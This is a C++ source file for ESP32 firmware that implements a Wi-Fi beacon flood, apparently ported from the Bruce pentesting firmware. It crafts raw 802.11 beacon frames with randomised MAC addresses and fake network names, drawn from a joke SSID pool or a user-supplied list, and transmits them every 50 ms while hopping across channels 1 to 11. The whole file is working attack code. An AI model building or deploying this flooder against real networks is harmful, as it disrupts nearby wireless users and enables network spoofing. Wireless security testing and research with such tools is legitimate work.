// ============================================================
//  beacon_spam.cpp  -  Fake AP Beacon Flood (ported from Bruce)
// ============================================================
#include "beacon_spam.h"
#include "scoped_lock.h"
#include "esp_wifi.h"
#include <WiFi.h>
#include <cstring>

BeaconSpam beaconSpam;

// ── Beacon packet template (from Bruce wifi_atks.cpp) ────────
static const uint8_t kBeaconTemplate[BEACON_PKT_LEN] = {
    0x80,0x00,0x00,0x00,                          // Type: beacon
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,                 // Dst: broadcast
    0x01,0x02,0x03,0x04,0x05,0x06,                // Src (overwritten)
    0x01,0x02,0x03,0x04,0x05,0x06,                // BSSID (overwritten)
    0x00,0x00,                                     // Seq
    0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,     // Timestamp
    0xe8,0x03,                                     // Interval 1s
    0x31,0x00,                                     // Capability
    0x00,0x20,                                     // SSID tag + len 32
    0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,     // SSID (32 bytes)
    0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
    0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
    0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
    0x01,0x08,                                     // Supported rates
    0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,
    0x03,0x01,0x01,                                // Channel tag
    0x30,0x18,0x01,0x00,                           // RSN
    0x00,0x0f,0xac,0x02,0x02,0x00,
    0x00,0x0f,0xac,0x04,0x00,0x0f,0xac,0x04,
    0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00
};

static const uint8_t kChannels[] = {1,2,3,4,5,6,7,8,9,10,11};
static uint8_t _chIdx = 0;

// ── Default random SSID pool ─────────────────────────────────
static const char* kRandPool[] = {
    "FBI Surveillance Van","Free WiFi","NSA Mobile Unit",
    "Pretty Fly for a WiFi","Martin Router King",
    "Tell My WiFi Love Her","Bill Wi the Science Fi",
    "Wu-Tang LAN","The LAN Before Time","Silence of the LANs",
    "Loading...","Not Your Network","Hack Me If You Can",
    "Router? I Barely Know Her","GetOffMyLAN",
    "DropItLikeItsHotspot","Yell ____ for Password",
    "Series of Tubes","Panic at the Cisco","Abraham Linksys",
    "John Wilkes Bluetooth","Pretty Fly (for a WiFi)",
    "The Password Is 1234","No More Mr. WiFi",
    "IP Freely","404 Network Unavailable"
};
#define RAND_POOL_SIZE (sizeof(kRandPool)/sizeof(kRandPool[0]))

void BeaconSpam::begin() {
    if (!_ssidMux) _ssidMux = xSemaphoreCreateRecursiveMutex();
    Serial.println("[BEACON] Ready");
}

void BeaconSpam::start(BeaconMode mode, uint8_t channel) {
    _mode      = mode;
    _active    = true;
    _hop       = (channel == 0);
    _channel   = _hop ? 1 : channel;
    _sentCount = 0;
    _startMs   = millis();
    _lastTxMs  = 0;
    _lastHopMs = 0;
    _ssidIdx   = 0;
    randomSeed(millis());

    // WiFi must be in promiscuous/raw TX capable mode
    WiFi.mode(WIFI_AP);
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    Serial.printf("[BEACON] Started mode=%u ch=%u hop=%d\n",
                  (uint8_t)mode, _channel, _hop);
}

void BeaconSpam::stop() {
    _active = false;
    Serial.printf("[BEACON] Stopped sent=%lu\n", _sentCount);
}

void BeaconSpam::clearSsids() {
    ScopedLock lk(_ssidMux);
    _ssids.clear();
}
void BeaconSpam::addSsid(const String& s) {
    ScopedLock lk(_ssidMux);
    if (_ssids.size() < BEACON_MAX_SSIDS) _ssids.push_back(s);
}
void BeaconSpam::setSsids(const std::vector<String>& l) {
    ScopedLock lk(_ssidMux);
    _ssids = l;
}

void BeaconSpam::_randomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
    mac[0] = (mac[0] & 0xFE) | 0x02; // locally administered, unicast
}

String BeaconSpam::_randomSsid() {
    return String(kRandPool[random(RAND_POOL_SIZE)]);
}

void BeaconSpam::_nextChannel() {
    _chIdx = (_chIdx + 1) % (sizeof(kChannels) / sizeof(kChannels[0]));
    _channel = kChannels[_chIdx];
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
}

void BeaconSpam::_sendBeacon(const char* ssid, uint8_t ssidLen,
                              const uint8_t* mac, uint8_t ch) {
    memcpy(_pkt, kBeaconTemplate, BEACON_PKT_LEN);
    memcpy(&_pkt[10], mac, 6); // src
    memcpy(&_pkt[16], mac, 6); // bssid
    memset(&_pkt[38], 0x20, 32);
    if (ssidLen > 32) ssidLen = 32;
    _pkt[37] = ssidLen;
    memcpy(&_pkt[38], ssid, ssidLen);
    _pkt[82] = ch;
    esp_wifi_80211_tx(WIFI_IF_AP, _pkt, BEACON_PKT_LEN, false);
}

void BeaconSpam::loop() {
    if (!_active) return;

    uint32_t now = millis();

    // Hop channel every 200ms
    if (_hop && now - _lastHopMs > 200) {
        _lastHopMs = now;
        _nextChannel();
    }

    // Send beacon every 50ms
    if (now - _lastTxMs < 50) return;
    _lastTxMs = now;

    uint8_t mac[6];
    _randomMac(mac);

    switch (_mode) {
        case BeaconMode::RANDOM: {
            String s = _randomSsid();
            _sendBeacon(s.c_str(), s.length(), mac, _channel);
            break;
        }
        case BeaconMode::LIST: {
            // Snapshot the list under the lock so a concurrent clearSsids()
            // on Core 0 can't make _ssids.size() become 0 between the
            // empty() check and the modulo — that was a divide-by-zero crash.
            String s;
            {
                ScopedLock lk(_ssidMux);
                if (_ssids.empty()) {
                    s = _randomSsid();
                } else {
                    size_t sz = _ssids.size();          // stable under lock
                    s = _ssids[_ssidIdx % sz];
                    _ssidIdx++;
                }
            }
            _sendBeacon(s.c_str(), s.length(), mac, _channel);
            break;
        }
        case BeaconMode::CLONE: {
            String s = _randomSsid();
            _sendBeacon(s.c_str(), s.length(), mac, _channel);
            break;
        }
    }
    _sentCount++;
}

String BeaconSpam::statusJson() const {
    static const char* modeNames[] = {"random","list","clone"};
    char buf[160];
    snprintf(buf, sizeof(buf),
        "{\"active\":%s,\"mode\":\"%s\",\"channel\":%u,"
        "\"hop\":%s,\"sent\":%lu,\"ssidCount\":%u}",
        _active ? "true" : "false",
        modeNames[(uint8_t)_mode % 3],
        _channel,
        _hop ? "true" : "false",
        _sentCount,
        (unsigned)_ssids.size());
    return String(buf);
}
